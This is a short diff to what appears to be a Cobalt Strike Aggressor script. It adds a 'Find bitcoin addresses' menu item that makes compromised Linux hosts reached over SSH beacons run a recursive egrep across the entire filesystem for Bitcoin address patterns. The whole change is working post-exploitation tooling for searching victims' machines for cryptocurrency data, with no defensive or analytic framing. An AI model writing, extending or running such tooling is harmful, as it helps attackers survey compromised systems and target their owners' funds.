@@ -54,5 +54,18 @@ popup beacon_bottom {
 				}
 			}
 		}
+		menu "Linux"{
+			item "Find bitcoin addresses"{
+				local('$bid');
+				foreach $bid ($1){
+					if (-isssh $bid){
+							bshell($1, 'egrep "^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$" / -R 2>/dev/null');
+					}
+					else {
+						blog($1, "This is not an SSH beacon!");
+					}
+				}
+			}
+		}
 	}
 }
